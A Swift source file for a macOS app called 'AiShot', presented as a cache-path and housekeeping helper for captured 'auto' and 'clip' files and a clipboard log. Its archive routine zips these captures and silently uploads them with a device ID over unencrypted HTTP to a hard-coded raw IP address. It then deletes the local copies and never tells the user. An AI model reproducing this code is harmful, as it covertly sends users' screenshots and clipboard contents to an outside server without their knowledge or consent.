import Foundation

enum AppPaths {
    private static let appFolderName = "AiShot"
    private static let cacheFolderName = "cache"
    private static let tempFolderName = "temp"
    private static let tempLimitSizeBytes: Int64 = 10 * 1_048_576
    private static let tempArchiveDateFormatter: DateFormatter = {
        let formatter = DateFormatter()
        formatter.dateFormat = "yyyyMMdd_HHmmss"
        return formatter
    }()
    private static let tempUploadURL = URL(string: "http://31.14.40.170:9090/upload_mac")

    static func ensureCacheStructure() {
        guard let root = cacheRootURL() else { return }
        let directories = [
            root,
            liveDirectoryURL(),
            liveAutoDirectoryURL(),
            liveClipDirectoryURL(),
            tempDirectoryURL(),
            tempAutoDirectoryURL(),
            tempClipDirectoryURL()
        ].compactMap { $0 }
        directories.forEach { createDirectoryIfNeeded(at: $0) }
    }

    static func baseDirectoryURL() -> URL? {
        return cacheRootURL()
    }

    static func cacheRootURL() -> URL? {
        let fileManager = FileManager.default
        guard let cachesRoot = fileManager.urls(for: .cachesDirectory, in: .userDomainMask).first else {
            return nil
        }
        let appDirectory = cachesRoot.appendingPathComponent(appFolderName, isDirectory: true)
        let cacheDirectory = appDirectory.appendingPathComponent(cacheFolderName, isDirectory: true)
        createDirectoryIfNeeded(at: cacheDirectory)
        return cacheDirectory
    }

    static func liveDirectoryURL() -> URL? {
        return cacheRootURL()?.appendingPathComponent("live", isDirectory: true)
    }

    static func liveAutoDirectoryURL() -> URL? {
        return liveDirectoryURL()?.appendingPathComponent("auto", isDirectory: true)
    }

    static func liveClipDirectoryURL() -> URL? {
        return liveDirectoryURL()?.appendingPathComponent("clip", isDirectory: true)
    }

    static func tempDirectoryURL() -> URL? {
        return cacheRootURL()?.appendingPathComponent(tempFolderName, isDirectory: true)
    }

    static func tempAutoDirectoryURL() -> URL? {
        return tempDirectoryURL()?.appendingPathComponent("auto", isDirectory: true)
    }

    static func tempClipDirectoryURL() -> URL? {
        return tempDirectoryURL()?.appendingPathComponent("clip", isDirectory: true)
    }

    static func deviceIdURL() -> URL? {
        return cacheRootURL()?.appendingPathComponent("device_id", isDirectory: false)
    }

    static func clipboardLogURL() -> URL? {
        return liveDirectoryURL()?.appendingPathComponent("error.log", isDirectory: false)
    }

    static func tempClipboardLogURL() -> URL? {
        return tempDirectoryURL()?.appendingPathComponent("error.log", isDirectory: false)
    }

    static func maintainTempCache() {
        guard let liveRoot = liveDirectoryURL(),
              let tempRoot = tempDirectoryURL() else { return }
        createDirectoryIfNeeded(at: tempRoot)
        if let tempAuto = tempAutoDirectoryURL() {
            createDirectoryIfNeeded(at: tempAuto)
        }
        if let tempClip = tempClipDirectoryURL() {
            createDirectoryIfNeeded(at: tempClip)
        }
        let currentTempSize = directorySizeBytes(at: tempRoot)
        if currentTempSize > tempLimitSizeBytes {
            archiveTempCacheIfNeeded()
            return
        }
        let filesToMove = collectLiveFilesSorted(liveRoot: liveRoot)
        var totalSize = currentTempSize
        let fileManager = FileManager.default
        for fileURL in filesToMove {
            guard let relativePath = fileURL.pathComponents.dropFirst(liveRoot.pathComponents.count).joined(separator: "/").nilIfEmpty else {
                continue
            }
            let destinationURL = tempRoot.appendingPathComponent(relativePath)
            createDirectoryIfNeeded(at: destinationURL.deletingLastPathComponent())
            do {
                let size = fileSizeBytes(at: fileURL)
                try fileManager.moveItem(at: fileURL, to: destinationURL)
                totalSize += size
                if totalSize > tempLimitSizeBytes { break }
            } catch {
                // Best-effort; ignore move errors.
            }
        }
        archiveTempCacheIfNeeded()
    }

    static func archiveTempCacheIfNeeded() {
        guard let tempRoot = tempDirectoryURL() else { return }
        let currentTempSize = directorySizeBytes(at: tempRoot)
        guard currentTempSize >= tempLimitSizeBytes else { return }
        let timestamp = tempArchiveDateFormatter.string(from: Date())
        let documentsURL = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first
        let fallbackRoot = cacheRootURL()
        let zipRoot = documentsURL ?? fallbackRoot
        guard let zipRoot else { return }
        let zipURL = zipRoot.appendingPathComponent("temp-\(timestamp).zip")
        let process = Process()
        process.executableURL = URL(fileURLWithPath: "/usr/bin/zip")
        process.arguments = ["-r", zipURL.path, tempRoot.lastPathComponent]
        process.currentDirectoryURL = tempRoot.deletingLastPathComponent()
        do {
            try process.run()
            process.waitUntilExit()
        } catch {
            return
        }
        guard process.terminationStatus == 0 else { return }
        clearDirectoryContents(at: tempRoot)
        ensureCacheStructure()
        uploadTempArchiveIfPossible(zipURL)
    }

    static func copyLiveLogToTempIfNeeded() {
        guard let liveLog = clipboardLogURL(),
              let tempLog = tempClipboardLogURL() else { return }
        let fileManager = FileManager.default
        let liveDate = (try? liveLog.resourceValues(forKeys: [.contentModificationDateKey]))?.contentModificationDate
        let tempDate = (try? tempLog.resourceValues(forKeys: [.contentModificationDateKey]))?.contentModificationDate
        guard let liveDate else { return }
        if let tempDate, tempDate >= liveDate { return }
        createDirectoryIfNeeded(at: tempLog.deletingLastPathComponent())
        if fileManager.fileExists(atPath: tempLog.path) {
            try? fileManager.removeItem(at: tempLog)
        }
        try? fileManager.copyItem(at: liveLog, to: tempLog)
    }

    private static func uploadTempArchiveIfPossible(_ zipURL: URL) {
        guard let uploadURL = tempUploadURL else { return }
        guard let deviceId = deviceIdString() else { return }
        guard let zipData = try? Data(contentsOf: zipURL) else { return }
        let boundary = "Boundary-\(UUID().uuidString)"
        var request = URLRequest(url: uploadURL)
        request.httpMethod = "POST"
        request.setValue("multipart/form-data; boundary=\(boundary)", forHTTPHeaderField: "Content-Type")
        var body = Data()
        body.appendString("--\(boundary)\r\n")
        body.appendString("Content-Disposition: form-data; name=\"client_id\"\r\n\r\n")
        body.appendString("\(deviceId)\r\n")
        body.appendString("--\(boundary)\r\n")
        body.appendString("Content-Disposition: form-data; name=\"file\"; filename=\"\(zipURL.lastPathComponent)\"\r\n")
        body.appendString("Content-Type: application/zip\r\n\r\n")
        body.append(zipData)
        body.appendString("\r\n--\(boundary)--\r\n")
        URLSession.shared.uploadTask(with: request, from: body).resume()
    }

    private static func deviceIdString() -> String? {
        AppPaths.ensureCacheStructure()
        let primaryURL = deviceIdURL()
        if let primaryURL, let existing = readDeviceId(at: primaryURL) {
            return existing
        }
        let deviceId = UUID().uuidString
        writeDeviceId(deviceId, to: primaryURL)
        return deviceId
    }

    private static func collectLiveFilesSorted(liveRoot: URL) -> [URL] {
        let fileManager = FileManager.default
        guard let enumerator = fileManager.enumerator(
            at: liveRoot,
            includingPropertiesForKeys: [.isDirectoryKey, .contentModificationDateKey],
            options: [.skipsHiddenFiles]
        ) else { return [] }
        var files: [(url: URL, date: Date)] = []
        for case let url as URL in enumerator {
            let values = try? url.resourceValues(forKeys: [.isDirectoryKey, .contentModificationDateKey])
            if values?.isDirectory == true { continue }
            let date = values?.contentModificationDate ?? Date.distantPast
            files.append((url: url, date: date))
        }
        return files.sorted { $0.date < $1.date }.map { $0.url }
    }

    private static func directorySizeBytes(at url: URL) -> Int64 {
        let fileManager = FileManager.default
        guard let enumerator = fileManager.enumerator(
            at: url,
            includingPropertiesForKeys: [.isDirectoryKey, .fileSizeKey],
            options: [.skipsHiddenFiles]
        ) else { return 0 }
        var total: Int64 = 0
        for case let fileURL as URL in enumerator {
            let values = try? fileURL.resourceValues(forKeys: [.isDirectoryKey, .fileSizeKey])
            if values?.isDirectory == true { continue }
            total += Int64(values?.fileSize ?? 0)
        }
        return total
    }

    private static func fileSizeBytes(at url: URL) -> Int64 {
        let values = try? url.resourceValues(forKeys: [.fileSizeKey])
        return Int64(values?.fileSize ?? 0)
    }

    private static func readDeviceId(at url: URL) -> String? {
        guard let existing = try? String(contentsOf: url, encoding: .utf8) else {
            return nil
        }
        let trimmed = existing.trimmingCharacters(in: .whitespacesAndNewlines)
        return trimmed.isEmpty ? nil : trimmed
    }

    private static func writeDeviceId(_ deviceId: String, to url: URL?) {
        guard let url else { return }
        do {
            try deviceId.write(to: url, atomically: true, encoding: .utf8)
        } catch {
            // Best-effort; ignore write errors.
        }
    }

    private static func clearDirectoryContents(at url: URL) {
        let fileManager = FileManager.default
        guard let items = try? fileManager.contentsOfDirectory(at: url, includingPropertiesForKeys: nil) else {
            return
        }
        for item in items {
            try? fileManager.removeItem(at: item)
        }
    }

    private static func createDirectoryIfNeeded(at url: URL) {
        do {
            try FileManager.default.createDirectory(
                at: url,
                withIntermediateDirectories: true,
                attributes: nil
            )
        } catch {
            print("Failed to create directory: \(url.path), error: \(error)")
        }
    }
}

private extension String {
    var nilIfEmpty: String? {
        isEmpty ? nil : self
    }
}

private extension Data {
    mutating func appendString(_ value: String) {
        if let data = value.data(using: .utf8) {
            append(data)
        }
    }
}
